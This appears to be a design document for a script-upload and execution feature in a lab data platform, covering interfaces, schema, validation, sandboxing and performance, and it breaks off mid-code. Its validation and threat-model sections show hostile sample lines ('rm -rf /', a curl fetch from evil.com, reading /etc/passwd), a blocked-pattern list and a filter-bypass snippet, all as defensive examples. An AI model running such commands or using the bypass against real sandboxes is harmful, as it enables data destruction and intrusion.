# Custom Data Analysis Scripts - Detailed Elaboration

This document provides comprehensive explanations, rationale, and decision-making guidance for the Analysis Scripts feature strategy.

---

## Table of Contents

1. [Phase-by-Phase Elaboration](#phase-by-phase-elaboration)
2. [Technical Decision Points](#technical-decision-points)
3. [Architecture Rationale](#architecture-rationale)
4. [Security Deep Dive](#security-deep-dive)
5. [Performance Considerations](#performance-considerations)
6. [Alternative Approaches Considered](#alternative-approaches-considered)
7. [Integration with Existing System](#integration-with-existing-system)
8. [Future Extensibility](#future-extensibility)

---

## Phase-by-Phase Elaboration

### Phase 1: Core Infrastructure (Foundation)

#### Why Start Here?
**Foundation First Approach**: Before building UI or executing scripts, we need solid infrastructure. This phase establishes:
- **Data models** (how we represent scripts and results)
- **Database schema** (where results are stored)
- **Service interfaces** (contracts for future implementation)

This allows parallel development: frontend team can work against interfaces while backend implements logic.

#### Domain Structure Explained

```
Domains/Analysis/
├── Services/           # Business logic layer
├── Models/             # Domain entities (not DB entities!)
├── Platform/           # OS-specific abstractions
└── Database/           # EF Core entities
```

**Why Separate Models/ and Database/?**
- **Models/** contains rich domain objects with behavior (e.g., `AnalysisScript` with validation methods)
- **Database/** contains EF Core entities optimized for persistence (flat structure, navigation properties)
- This separation allows domain logic to evolve independently from persistence concerns

#### Services Layer Breakdown

**1. IAnalysisService** - Orchestration layer
```csharp
public interface IAnalysisService
{
    // Primary workflow: Execute analysis on a dataset
    Task<AnalysisResult> ExecuteAnalysisAsync(
        Guid datasetId,           // Which dataset to analyze
        Guid scriptId,             // Which script to run
        Dictionary<string, object> parameters  // User-provided params
    );

    // Query operations
    Task<List<AnalysisResult>> GetAnalysisHistoryAsync(Guid datasetId);
    Task<AnalysisResult> GetAnalysisResultAsync(Guid resultId);

    // Management
    Task<bool> DeleteAnalysisResultAsync(Guid resultId);
}
```

**Why This Design?**
- **Simple API**: UI only needs to call one method to execute analysis
- **Async Throughout**: Long-running script execution won't block web requests
- **Testable**: Interface allows mocking for unit tests
- **Evolution**: Can add caching, queuing, or batch processing later without breaking contracts

**2. IScriptExecutor** - Execution abstraction
```csharp
public interface IScriptExecutor
{
    ScriptLanguage SupportedLanguage { get; }  // Python, R, etc.

    Task<ProcessResult> ExecuteScriptAsync(
        string scriptPath,         // Full path to script file
        string inputJson,          // Data as JSON string
        string outputDirectory,    // Where to save images
        Dictionary<string, object> parameters,  // User params
        int timeoutSeconds = 300   // Safety limit
    );

    bool IsInterpreterAvailable();  // Can we run this language?
}
```

**Why Multiple Executors?**
- **Language-Specific Logic**: Python needs `MPLBACKEND=Agg` on Linux, R doesn't
- **Isolated Testing**: Test Python executor without installing R
- **Future Languages**: Add Julia/MATLAB by implementing interface
- **Platform Differences**: Windows uses `python`, Linux uses `python3`

**3. IScriptManagementService** - CRUD operations
```csharp
public interface IScriptManagementService
{
    // Discovery - Different sources of scripts
    Task<List<AnalysisScriptMetadata>> GetBuiltInScriptsAsync();
    Task<List<AnalysisScriptMetadata>> GetUserScriptsAsync(string userId);
    Task<List<AnalysisScriptMetadata>> GetSharedScriptsAsync();

    // Upload workflow
    Task<ScriptUploadResult> UploadScriptAsync(
        string userId,
        string scriptContent,     // Raw .py file content
        AnalysisScriptMetadata metadata  // Name, description, tags
    );

    // Execution needs
    Task<string> GetScriptPathAsync(Guid scriptId);
    Task<string> GetScriptContentAsync(Guid scriptId);
}
```

**Why Separate from IAnalysisService?**
- **Single Responsibility**: Script management vs. execution are different concerns
- **Different Callers**: Upload UI uses ScriptManagement, ViewDataset uses Analysis
- **Independent Evolution**: Can optimize script discovery without touching execution logic

**4. IScriptValidationService** - Security gatekeeper
```csharp
public interface IScriptValidationService
{
    Task<ValidationResult> ValidateScriptAsync(
        string scriptContent,
        ScriptLanguage language
    );
}

public class ValidationResult
{
    public bool IsValid { get; set; }
    public string Status { get; set; }  // "passed" | "warning" | "failed"
    public List<ValidationError> Errors { get; set; }
    public List<ValidationWarning> Warnings { get; set; }
}
```

**Validation Levels Explained**:

| Status | Meaning | Can Execute? | Example |
|--------|---------|--------------|---------|
| **passed** | No issues found | ✅ Yes | Well-formed script with proper imports |
| **warning** | Potential issues | ✅ Yes (with caution) | Uses `open()` for file I/O (might fail) |
| **failed** | Security or syntax error | ❌ No | Contains `os.system()` or syntax errors |

**Why Three Levels?**
- **Flexibility**: Some scripts need file I/O (legitimate use case)
- **Security**: Block dangerous operations (eval, exec, subprocess)
- **User Education**: Warnings teach best practices

#### Database Schema Deep Dive

**AnalysisResults Table**:
```sql
CREATE TABLE AnalysisResults (
    Id                UNIQUEIDENTIFIER PRIMARY KEY,     -- Unique result ID
    DatasetId         UNIQUEIDENTIFIER NOT NULL,        -- FK to Datasets
    ScriptName        NVARCHAR(255) NOT NULL,           -- For display
    ScriptLanguage    NVARCHAR(50) NOT NULL,            -- "Python", "R"
    ScriptVersion     NVARCHAR(50),                     -- Script versioning
    ExecutionDate     DATETIME NOT NULL,                -- When was this run?
    Status            NVARCHAR(50) NOT NULL,            -- "Success", "Failed", "Timeout"
    Parameters        NVARCHAR(MAX),                    -- JSON of user params
    ResultImagePath   NVARCHAR(500),                    -- Relative path to PNG
    ResultDataJson    NVARCHAR(MAX),                    -- JSON with statistics
    ErrorMessage      NVARCHAR(MAX),                    -- If failed, why?
    ExecutionTimeMs   INT,                              -- Performance tracking

    FOREIGN KEY (DatasetId) REFERENCES Datasets(Id) ON DELETE CASCADE
);

-- Indexes for common queries
CREATE INDEX IX_AnalysisResults_DatasetId ON AnalysisResults(DatasetId);
CREATE INDEX IX_AnalysisResults_ExecutionDate ON AnalysisResults(ExecutionDate DESC);
```

**Design Decisions**:

1. **Why Store ScriptName instead of ScriptId FK?**
   - Scripts can be deleted by users
   - Results should remain viewable even if script is gone
   - ScriptName provides context in historical views

2. **Why JSON in ResultDataJson?**
   - Flexible schema (different scripts return different stats)
   - Easy to display in UI (parse and render dynamically)
   - Future-proof (add new fields without migration)

3. **Why Cascade Delete on DatasetId?**
   - If dataset is deleted, results have no meaning
   - Prevents orphaned records
   - Automatically cleans up storage

4. **Why ExecutionTimeMs?**
   - Performance monitoring (slow scripts?)
   - User feedback (expected wait time)
   - Optimization opportunities

**Migration Strategy**:
```bash
# Create migration
dotnet ef migrations add AddAnalysisResults --project YourProject.csproj

# Review generated migration file
# Verify Up() and Down() methods

# Apply to database
dotnet ef database update

# Verify schema
sqlite3 smartlab.db ".schema AnalysisResults"
```

---

### Phase 2: Script Infrastructure

#### Directory Structure Rationale

```
analysis-scripts/
├── _templates/          # Read-only documentation
├── built-in/            # System-provided, validated scripts
└── user-uploads/        # User-contributed scripts
```

**Why Three-Tier Structure?**

**1. _templates/ (Read-Only)**
- **Purpose**: Educational examples for users
- **Content**: Heavily commented, pedagogical code
- **Access**: Read-only (cannot be executed directly)
- **Versioning**: Tracked in Git alongside application code

Example template structure:
```python
#!/usr/bin/env python3
"""
SmartLab Analysis Script Template
==================================

This template demonstrates how to create a custom analysis script.

INPUT CONTRACT:
  - JSON data received via stdin
  - Must contain: datasetId, datasetName, dataPoints[]

OUTPUT CONTRACT:
  - JSON written to stdout
  - Must contain: status, imagePath
  - Optional: statistics, metadata

EXECUTION:
  python script.py /output/directory
"""

import sys
import json
import matplotlib
matplotlib.use('Agg')  # Non-GUI backend (required for servers)
import matplotlib.pyplot as plt
from pathlib import Path

def main():
    # STEP 1: Read input from stdin
    # ================================
    # SmartLab passes dataset as JSON via stdin
    input_data = json.load(sys.stdin)

    # Extract required fields
    dataset_id = input_data['datasetId']
    dataset_name = input_data['datasetName']
    data_points = input_data['dataPoints']  # List of {timestamp, value, unit}

    # Extract user parameters (optional)
    params = input_data.get('parameters', {})
    window_size = params.get('window_size', 10)

    # STEP 2: Get output directory from command line
    # ===============================================
    output_dir = sys.argv[1] if len(sys.argv) > 1 else '.'

    # STEP 3: Process data
    # ====================
    timestamps = [dp['timestamp'] for dp in data_points]
    values = [float(dp['value']) for dp in data_points]

    # Your analysis logic here...
    mean_value = sum(values) / len(values)

    # STEP 4: Generate visualization
    # ===============================
    plt.figure(figsize=(10, 6))
    plt.plot(timestamps, values, marker='o', linestyle='-')
    plt.title(f'Analysis: {dataset_name}')
    plt.xlabel('Time')
    plt.ylabel('Value')
    plt.xticks(rotation=45)
    plt.tight_layout()

    # STEP 5: Save image to output directory
    # =======================================
    # Use first 8 chars of dataset ID for unique filename
    output_filename = f"result_{dataset_id[:8]}.png"
    output_path = Path(output_dir) / output_filename
    plt.savefig(output_path, dpi=150, bbox_inches='tight')
    plt.close()

    # STEP 6: Return result as JSON to stdout
    # ========================================
    result = {
        "status": "success",
        "imagePath": output_filename,
        "statistics": {
            "mean": mean_value,
            "count": len(values)
        },
        "metadata": {
            "scriptVersion": "1.0.0"
        }
    }

    # Print to stdout (SmartLab reads this)
    print(json.dumps(result))

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        # ALWAYS catch exceptions and return error JSON
        error_result = {
            "status": "error",
            "errorMessage": str(e),
            "errorType": type(e).__name__
        }
        print(json.dumps(error_result))
        sys.exit(1)  # Non-zero exit code indicates failure
```

**2. built-in/ (System Scripts)**
- **Purpose**: Production-ready, tested scripts
- **Quality Bar**: High - includes error handling, edge cases
- **Maintenance**: Updated with application releases
- **Examples**:
  - `basic_line_plot.py`: Simple time-series visualization
  - `histogram.py`: Distribution analysis
  - `statistical_summary.py`: Mean, std, min, max, quartiles
  - `multi_parameter_plot.py`: Overlay multiple measurements

**Why Built-in Scripts?**
- **Immediate Value**: Users can analyze data without writing code
- **Reference Implementation**: Show best practices
- **Quality Assurance**: Thoroughly tested, documented
- **Discoverability**: New users see what's possible

Example built-in script:
```python
# built-in/python/statistical_summary.py
#!/usr/bin/env python3
"""
Statistical Summary Analysis
=============================
Generates comprehensive statistical analysis with box plots and tables.

Author: SmartLab Team
Version: 1.0.0
License: MIT
"""

import sys
import json
import numpy as np
import matplotlib.pyplot as plt
import matplotlib.patches as mpatches
from pathlib import Path

def calculate_statistics(values):
    """Calculate comprehensive statistics."""
    return {
        'count': len(values),
        'mean': float(np.mean(values)),
        'std': float(np.std(values)),
        'min': float(np.min(values)),
        'max': float(np.max(values)),
        'median': float(np.median(values)),
        'q1': float(np.percentile(values, 25)),
        'q3': float(np.percentile(values, 75)),
        'iqr': float(np.percentile(values, 75) - np.percentile(values, 25))
    }

def create_visualization(data_points, stats, output_path, dataset_name):
    """Create multi-panel statistical visualization."""
    fig, axes = plt.subplots(2, 2, figsize=(12, 10))
    fig.suptitle(f'Statistical Analysis: {dataset_name}', fontsize=14, fontweight='bold')

    values = [float(dp['value']) for dp in data_points]
    timestamps = [dp['timestamp'] for dp in data_points]

    # Panel 1: Time series with mean line
    axes[0, 0].plot(timestamps, values, 'b-', alpha=0.7, label='Data')
    axes[0, 0].axhline(stats['mean'], color='r', linestyle='--', label='Mean')
    axes[0, 0].fill_between(
        range(len(values)),
        stats['mean'] - stats['std'],
        stats['mean'] + stats['std'],
        alpha=0.2, color='r', label='±1σ'
    )
    axes[0, 0].set_title('Time Series')
    axes[0, 0].set_xlabel('Time')
    axes[0, 0].set_ylabel('Value')
    axes[0, 0].legend()
    axes[0, 0].grid(True, alpha=0.3)

    # Panel 2: Histogram with normal distribution overlay
    axes[0, 1].hist(values, bins=30, density=True, alpha=0.7, color='blue', edgecolor='black')
    axes[0, 1].set_title('Distribution')
    axes[0, 1].set_xlabel('Value')
    axes[0, 1].set_ylabel('Density')
    axes[0, 1].grid(True, alpha=0.3)

    # Panel 3: Box plot
    bp = axes[1, 0].boxplot(values, vert=True, patch_artist=True)
    bp['boxes'][0].set_facecolor('lightblue')
    axes[1, 0].set_title('Box Plot')
    axes[1, 0].set_ylabel('Value')
    axes[1, 0].grid(True, alpha=0.3, axis='y')

    # Panel 4: Statistics table
    axes[1, 1].axis('off')
    stats_text = f"""
    Statistical Summary
    ═══════════════════
    Count:    {stats['count']}
    Mean:     {stats['mean']:.4f}
    Std Dev:  {stats['std']:.4f}
    Min:      {stats['min']:.4f}
    Q1:       {stats['q1']:.4f}
    Median:   {stats['median']:.4f}
    Q3:       {stats['q3']:.4f}
    Max:      {stats['max']:.4f}
    IQR:      {stats['iqr']:.4f}
    """
    axes[1, 1].text(0.1, 0.5, stats_text, fontfamily='monospace', fontsize=11, va='center')

    plt.tight_layout()
    plt.savefig(output_path, dpi=150, bbox_inches='tight')
    plt.close()

def main():
    # Read input
    input_data = json.load(sys.stdin)
    output_dir = sys.argv[1] if len(sys.argv) > 1 else '.'

    # Extract data
    dataset_id = input_data['datasetId']
    dataset_name = input_data['datasetName']
    data_points = input_data['dataPoints']

    # Calculate statistics
    values = [float(dp['value']) for dp in data_points]
    stats = calculate_statistics(values)

    # Generate visualization
    output_filename = f"stats_{dataset_id[:8]}.png"
    output_path = Path(output_dir) / output_filename
    create_visualization(data_points, stats, output_path, dataset_name)

    # Return result
    result = {
        "status": "success",
        "imagePath": output_filename,
        "statistics": stats,
        "metadata": {
            "scriptVersion": "1.0.0",
            "scriptName": "Statistical Summary"
        }
    }
    print(json.dumps(result))

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(json.dumps({
            "status": "error",
            "errorMessage": str(e),
            "errorType": type(e).__name__
        }))
        sys.exit(1)
```

**3. user-uploads/ (User Scripts)**
```
user-uploads/
├── [user_id_1]/
│   ├── fft_analysis.py
│   ├── temperature_correlation.py
│   └── .metadata.json        # Script metadata cache
├── [user_id_2]/
│   └── custom_plot.py
└── shared/                    # Admin-promoted community scripts
    └── popular_analysis.py
```

**Why Per-User Directories?**
- **Isolation**: User A cannot see User B's scripts
- **Quota Management**: Easy to enforce per-user limits (e.g., max 50 scripts)
- **Cleanup**: Delete user directory when account removed
- **Permissions**: OS-level permissions can reinforce isolation

**Metadata Cache (.metadata.json)**:
```json
{
  "scripts": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "fileName": "fft_analysis.py",
      "displayName": "FFT Analysis",
      "description": "Performs Fast Fourier Transform on time-series data",
      "author": "john.doe@example.com",
      "uploadDate": "2025-11-07T10:30:00Z",
      "lastModified": "2025-11-07T10:30:00Z",
      "version": "1.0.0",
      "language": "python",
      "tags": ["fft", "frequency", "signal-processing"],
      "parameters": [
        {
          "name": "window_size",
          "displayName": "Window Size",
          "type": "number",
          "defaultValue": 128,
          "required": true,
          "min": 32,
          "max": 4096,
          "description": "FFT window size (must be power of 2)"
        }
      ],
      "validationStatus": "passed",
      "validationErrors": [],
      "isShared": false,
      "executionCount": 42,
      "lastExecuted": "2025-11-07T15:30:00Z",
      "averageExecutionTimeMs": 1250
    }
  ]
}
```

**Why Cache Metadata?**
- **Performance**: Don't parse Python files on every page load
- **Search**: Query by tags without opening files
- **Statistics**: Track execution count, performance
- **Atomic Updates**: Update cache when script changes

---

### Phase 3: Script Upload & Management UI

#### User Experience Flow

**Problem**: Users need a simple way to upload scripts without SSH/FTP access.

**Solution**: Web-based upload with live validation feedback.

**Step 1: Navigate to Script Management**
```
/Data/DataIndex → [Manage Scripts] button → /Analysis/ManageScripts
```

**Step 2: View Available Scripts (Tabs)**

| Tab | Content | Actions |
|-----|---------|---------|
| **Built-in Scripts** | System-provided scripts | View only (read-only) |
| **My Scripts** | User-uploaded scripts | Upload, Edit, Delete, Download |
| **Shared Scripts** | Community scripts | View, Copy to My Scripts |

**Step 3: Upload New Script (Modal Dialog)**

**Why Modal Instead of Separate Page?**
- **Context Preservation**: User stays on script management page
- **Immediate Feedback**: See upload result without navigation
- **Better UX**: Modern web pattern (Gmail, Slack use modals)

**Upload Form Fields**:

1. **File Upload** (Required)
   - Accept: `.py` only
   - Max Size: 1 MB
   - Drag-drop enabled
   - Live preview of file content

2. **Display Name** (Required)
   - Auto-filled from filename
   - User-friendly name shown in dropdowns
   - Example: "FFT Analysis" instead of "fft_analysis_v2_final.py"

3. **Description** (Optional)
   - Multi-line text
   - Shown in script selection
   - Helps future you remember what script does

4. **Tags** (Optional)
   - Comma-separated
   - Used for filtering/searching
   - Example: "fft, frequency, signal-processing"

5. **Version** (Optional)
   - Semantic versioning (1.0.0)
   - Track script evolution
   - Default: "1.0.0"

**Validation Happens Client + Server**:

**Client-Side (JavaScript)**:
```javascript
// Immediate feedback (before upload)
function previewScript(input) {
    const file = input.files[0];

    // Check size
    if (file.size > 1048576) {  // 1 MB
        showError("File too large (max 1 MB)");
        return;
    }

    // Check extension
    if (!file.name.endsWith('.py')) {
        showError("Only .py files allowed");
        return;
    }

    // Show preview
    const reader = new FileReader();
    reader.onload = (e) => {
        document.getElementById('scriptPreview').textContent = e.target.result;

        // Auto-fill display name
        const name = file.name.replace('.py', '').replace(/_/g, ' ');
        document.getElementById('displayName').value = capitalize(name);
    };
    reader.readAsText(file);
}
```

**Server-Side (C#)**:
```csharp
public async Task<IActionResult> OnPostUploadAsync(IFormFile scriptFile, ...)
{
    // 1. Basic validation
    if (scriptFile == null || scriptFile.Length == 0)
        return BadRequest("No file selected");

    if (scriptFile.Length > 1048576)
        return BadRequest("File exceeds 1 MB limit");

    if (!scriptFile.FileName.EndsWith(".py"))
        return BadRequest("Only Python files allowed");

    // 2. Read content
    using var reader = new StreamReader(scriptFile.OpenReadStream());
    var content = await reader.ReadToEndAsync();

    // 3. Validate script
    var validation = await _validationService.ValidateScriptAsync(
        content,
        ScriptLanguage.Python
    );

    // 4. Save if valid (or with warnings)
    if (validation.Status != "failed")
    {
        await _scriptService.UploadScriptAsync(userId, content, metadata);
    }

    // 5. Return result
    return Json(new {
        success = validation.Status != "failed",
        validationStatus = validation.Status,
        validationErrors = validation.Errors.Select(e => e.Message).ToList()
    });
}
```

#### Validation Service Deep Dive

**What Gets Validated?**

**1. Syntax Check** (Python -m py_compile)
```python
# Invalid syntax example
def analyze(data:
    return data.mean()  # SyntaxError: invalid syntax

# Validation catches this before execution
```

**2. Dangerous Operations**
```python
# BLOCKED: os.system()
import os
os.system("rm -rf /")  # ❌ DANGEROUS! Validation fails

# BLOCKED: subprocess
import subprocess
subprocess.call(['curl', 'evil.com/malware.sh'])  # ❌ BLOCKED

# BLOCKED: eval/exec
user_input = input()
eval(user_input)  # ❌ Code injection risk

# WARNING: open() (might be legitimate)
with open('/etc/passwd', 'r') as f:  # ⚠️ WARNING issued
    data = f.read()
```

**3. Required Structure**
```python
# GOOD: Has all required parts
import json
import sys
import matplotlib.pyplot as plt

def main():
    input_data = json.load(sys.stdin)
    # ... process ...
    print(json.dumps(result))

if __name__ == '__main__':
    main()

# MISSING: No JSON import → WARNING
# MISSING: No if __name__ guard → WARNING
```

**Validation Logic**:
```csharp
public async Task<ValidationResult> ValidateScriptAsync(string content, ScriptLanguage lang)
{
    var result = new ValidationResult { IsValid = true, Status = "passed" };

    // Check 1: Dangerous patterns
    var dangerousPatterns = new[] {
        "os.system", "subprocess.call", "subprocess.run",
        "eval(", "exec(", "__import__", "compile("
    };

    foreach (var pattern in dangerousPatterns)
    {
        if (content.Contains(pattern))
        {
            result.Errors.Add(new ValidationError {
                Code = "DANGEROUS_OPERATION",
                Message = $"Dangerous operation detected: {pattern}",
                LineNumber = FindLineNumber(content, pattern)
            });
            result.IsValid = false;
            result.Status = "failed";
        }
    }

    // Check 2: Syntax (actual Python compiler)
    var tempFile = Path.GetTempFileName() + ".py";
    await File.WriteAllTextAsync(tempFile, content);

    var psi = new ProcessStartInfo {
        FileName = "python",
        Arguments = $"-m py_compile \"{tempFile}\"",
        RedirectStandardError = true,
        UseShellExecute = false
    };

    using var process = Process.Start(psi);
    await process.WaitForExitAsync();

    if (process.ExitCode != 0)
    {
        var error = await process.StandardError.ReadToEndAsync();
        result.Errors.Add(new ValidationError {
            Code = "SYNTAX_ERROR",
            Message = $"Python syntax error: {error}"
        });
        result.IsValid = false;
        result.Status = "failed";
    }

    // Check 3: Required imports
    if (!content.Contains("import json"))
    {
        result.Warnings.Add(new ValidationWarning {
            Code = "MISSING_IMPORT",
            Message = "Script should import 'json' for I/O"
        });
        result.Status = "warning";
    }

    // Check 4: Main guard
    if (!content.Contains("if __name__"))
    {
        result.Warnings.Add(new ValidationWarning {
            Code = "MISSING_MAIN_GUARD",
            Message = "Script should use 'if __name__ == \"__main__\"' guard"
        });
        result.Status = "warning";
    }

    // Clean up
    File.Delete(tempFile);

    return result;
}
```

**Validation Status Display**:

| Status | Badge Color | Icon | Can Execute? | Message |
|--------|-------------|------|--------------|---------|
| **passed** | Green | ✓ | Yes | "Script validated successfully" |
| **warning** | Orange | ⚠ | Yes | "Script has warnings but can execute" |
| **failed** | Red | ✗ | No | "Script failed validation and cannot execute" |

---

## Technical Decision Points

### Decision 1: Process Isolation vs. In-Process Execution

**Options Considered**:

**Option A: In-Process (IronPython, Python.NET)**
```csharp
// Execute Python in same process
var engine = Python.CreateEngine();
var scope = engine.CreateScope();
engine.ExecuteFile("script.py", scope);
var result = scope.GetVariable("result");
```

**Pros**:
- Faster (no process startup overhead)
- Easier debugging
- Direct memory access

**Cons**:
- Security risk (script runs with app permissions)
- Can crash main app
- Hard to enforce timeouts
- Platform-dependent (needs Python.NET)

**Option B: External Process (Chosen)**
```csharp
// Execute Python as separate process
var process = new Process();
process.StartInfo.FileName = "python";
process.StartInfo.Arguments = "script.py";
process.Start();
await process.WaitForExitAsync(TimeSpan.FromMinutes(5));
```

**Pros**:
- **Strong isolation** (script cannot access app memory)
- **Timeout enforcement** (kill process if too long)
- **Crash containment** (script crash doesn't kill app)
- **Platform-independent** (works with any Python install)

**Cons**:
- Slower startup (~100ms overhead)
- IPC complexity (stdin/stdout communication)

**Decision: Option B (External Process)**

**Rationale**: Security and reliability trump performance. Script execution is infrequent (user-initiated), so 100ms overhead is acceptable.

---

### Decision 2: Script I/O Communication Method

**Options Considered**:

**Option A: Temporary Files**
```csharp
// Write input to file
File.WriteAllText("/tmp/input.json", jsonData);

// Execute script
var process = Process.Start("python", "script.py /tmp/input.json");

// Read output from file
var result = File.ReadAllText("/tmp/output.json");
```

**Pros**:
- Simple to implement
- Easy to debug (inspect files)

**Cons**:
- File I/O overhead
- Cleanup complexity
- Race conditions (multiple simultaneous executions)
- Security (temp file permissions)

**Option B: stdin/stdout Pipes (Chosen)**
```csharp
// Write to stdin
await process.StandardInput.WriteAsync(jsonData);
process.StandardInput.Close();

// Read from stdout
var result = await process.StandardOutput.ReadToEndAsync();
```

**Pros**:
- **No file I/O** (faster)
- **Automatic cleanup** (pipes destroyed with process)
- **Standard practice** (Unix philosophy)
- **Race-condition free**

**Cons**:
- Slightly more complex code
- Harder to debug (no files to inspect)

**Decision: Option B (stdin/stdout)**

**Rationale**: Performance, simplicity, and security. This is how Unix tools communicate (grep, sed, awk).

**Debugging Tip**: Add logging to capture stdin/stdout:
```csharp
_logger.LogDebug("Script input: {Input}", jsonData);
_logger.LogDebug("Script output: {Output}", result);
```

---

### Decision 3: Metadata Storage (File vs. Database)

**Options Considered**:

**Option A: Database Storage**
```sql
CREATE TABLE ScriptMetadata (
    Id GUID PRIMARY KEY,
    UserId NVARCHAR(255),
    FileName NVARCHAR(255),
    DisplayName NVARCHAR(255),
    Description NVARCHAR(MAX),
    Tags NVARCHAR(MAX),  -- JSON array
    ValidationStatus NVARCHAR(50),
    UploadDate DATETIME,
    ...
);
```

**Pros**:
- Queryable (filter by tags, search)
- Transactional (ACID guarantees)
- Consistent with rest of app

**Cons**:
- DB queries on every script list
- Requires migrations
- Harder to bulk operations

**Option B: JSON Cache File (Chosen)**
```
user-uploads/[user_id]/.metadata.json
```

**Pros**:
- **Fast reads** (single file read)
- **No migrations** (just JSON structure)
- **Portable** (move directory = move scripts)
- **Easy backup** (file copy)

**Cons**:
- Not queryable (full file read required)
- Potential corruption (need validation)
- Manual cache invalidation

**Decision: Option B (JSON Cache) with Hybrid Approach**

**Rationale**: Script lists are small (typically <100 per user). Full file read is fast. For global search, can add database index later.

**Hybrid Approach**:
```
- Metadata: JSON file (fast reads)
- Execution results: Database (queryable history)
- Search index: Optional database table for cross-user search
```

---

## Security Deep Dive

### Threat Model

**Attacker Scenarios**:

1. **Malicious Script Upload**
   - Attacker uploads script to steal data
   - Script reads `/etc/passwd` or database connection strings
   - Script exfiltrates data to external server

2. **Denial of Service**
   - Script enters infinite loop
   - Script consumes all memory
   - Script forks bombs the server

3. **Privilege Escalation**
   - Script exploits OS vulnerability
   - Script writes to system directories
   - Script executes system commands

### Mitigation Layers

**Layer 1: Static Analysis (Upload Time)**
```csharp
// Block dangerous patterns
var blockedPatterns = new[] {
    "os.system",           // Command execution
    "subprocess",          // Process creation
    "eval", "exec",        // Dynamic code execution
    "__import__",          // Import bypass
    "compile",             // Code compilation
    "socket",              // Network access
    "urllib", "requests",  // HTTP requests
    "ftplib", "smtplib"    // Network protocols
};

foreach (var pattern in blockedPatterns)
{
    if (scriptContent.Contains(pattern))
    {
        throw new SecurityException($"Blocked pattern: {pattern}");
    }
}
```

**Limitation**: Simple string matching can be bypassed:
```python
# Bypass attempt
os_system = getattr(__import__('os'), 'system')
os_system('malicious_command')
```

**Advanced Defense**: AST (Abstract Syntax Tree) parsing:
```python
# Validation script using Python's ast module
import ast

def validate_script(code):
    tree = ast.parse(code)

    for node in ast.walk(tree):
        # Block dangerous function calls
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ['eval', 'exec', 'compile']:
                    raise SecurityError(f"Blocked function: {node.func.id}")

        # Block dangerous imports
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in ['os', 'subprocess', 'socket']:
                    raise SecurityError(f"Blocked import: {alias.name}")
```

**Layer 2: Process Isolation (Execution Time)**
```csharp
var psi = new ProcessStartInfo {
    FileName = "python",
    Arguments = $"script.py {outputDir}",

    // Isolation settings
    UseShellExecute = false,       // Don't use shell (prevents command injection)
    CreateNoWindow = true,         // No GUI (server environment)
    RedirectStandardInput = true,  // Control input
    RedirectStandardOutput = true, // Capture output
    RedirectStandardError = true,  // Capture errors

    // Environment restrictions
    WorkingDirectory = tempDirectory,  // Sandboxed working dir
};

// Limit environment variables
psi.Environment.Clear();
psi.Environment["PYTHONPATH"] = "/allowed/modules";
psi.Environment["HOME"] = tempDirectory;

// Start process
var process = Process.Start(psi);

// Enforce timeout
bool completed = await process.WaitForExitAsync(TimeSpan.FromMinutes(5));

if (!completed)
{
    process.Kill(entireProcessTree: true);  // Kill process and children
    throw new TimeoutException("Script execution timeout");
}
```

**Layer 3: Resource Limits (OS Level)**

**Linux (cgroups)**:
```bash
# Create cgroup for script execution
cgcreate -g memory,cpu:smartlab_scripts

# Set memory limit (512 MB)
echo 536870912 > /sys/fs/cgroup/memory/smartlab_scripts/memory.limit_in_bytes

# Set CPU limit (50% of one core)
echo 50000 > /sys/fs/cgroup/cpu/smartlab_scripts/cpu.cfs_quota_us

# Execute script in cgroup
cgexec -g memory,cpu:smartlab_scripts python script.py
```

**Windows (Job Objects)**:
```csharp
// Create job object
var job = new JobObject();
job.SetLimits(new JobLimits {
    MaxMemoryBytes = 512 * 1024 * 1024,  // 512 MB
    MaxCpuPercent = 50,                   // 50% CPU
    MaxProcesses = 5                      // Limit fork bombs
});

// Assign process to job
job.AssignProcess(process);
```

**Layer 4: File System Restrictions**

```csharp
// Create temporary isolated directory
var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
Directory.CreateDirectory(tempDir);

// Set permissions (current user only)
var dirInfo = new DirectoryInfo(tempDir);
var dirSecurity = dirInfo.GetAccessControl();
dirSecurity.SetAccessRuleProtection(true, false);  // Disable inheritance
dirInfo.SetAccessControl(dirSecurity);

// Execute script with working directory set to temp
psi.WorkingDirectory = tempDir;

// Clean up after execution
Directory.Delete(tempDir, recursive: true);
```

**Layer 5: Network Isolation**

**Linux (iptables)**:
```bash
# Block outbound connections from script process
iptables -A OUTPUT -m owner --uid-owner scriptuser -j REJECT

# Or use network namespace
unshare --net python script.py  # No network access
```

**Windows (Firewall)**:
```powershell
# Create firewall rule blocking Python
New-NetFirewallRule -DisplayName "Block Python Scripts" `
    -Direction Outbound `
    -Program "C:\Python39\python.exe" `
    -Action Block
```

**Layer 6: Audit Logging**

```csharp
_logger.LogWarning("Script execution started", new {
    UserId = userId,
    ScriptId = scriptId,
    DatasetId = datasetId,
    StartTime = DateTime.UtcNow,
    SourceIP = HttpContext.Connection.RemoteIpAddress
});

// After execution
_logger.LogInformation("Script execution completed", new {
    UserId = userId,
    ScriptId = scriptId,
    Status = result.Status,
    ExecutionTimeMs = stopwatch.ElapsedMilliseconds,
    OutputSize = result.Output.Length,
    ExitCode = process.ExitCode
});

// Alert on suspicious activity
if (result.Status == "failed" && result.ErrorMessage.Contains("permission"))
{
    _logger.LogWarning("Potential security violation", new {
        UserId = userId,
        ScriptId = scriptId,
        Error = result.ErrorMessage
    });

    // Could trigger admin notification
    await _alertService.SendSecurityAlertAsync(...);
}
```

---

## Performance Considerations

### Execution Performance

**Typical Script Execution Timeline**:
```
┌─────────────────────────────────────────────────────────┐
│ Process Start     Python Init    Script Exec   I/O      │
│  (50-100ms)       (50-100ms)     (500-5000ms)  (10-50ms)│
└─────────────────────────────────────────────────────────┘
Total: 610-5250ms (depending on script complexity)
```

**Optimization Strategies**:

**1. Keep Python Process Warm (Process Pool)**
```csharp
public class PythonProcessPool
{
    private readonly Channel<Process> _pool;
    private const int PoolSize = 5;

    public PythonProcessPool()
    {
        _pool = Channel.CreateBounded<Process>(PoolSize);

        // Pre-warm processes
        for (int i = 0; i < PoolSize; i++)
        {
            var process = StartPythonProcess();
            _pool.Writer.TryWrite(process);
        }
    }

    public async Task<Process> GetProcessAsync()
    {
        return await _pool.Reader.ReadAsync();
    }

    public async Task ReturnProcessAsync(Process process)
    {
        if (process.HasExited)
        {
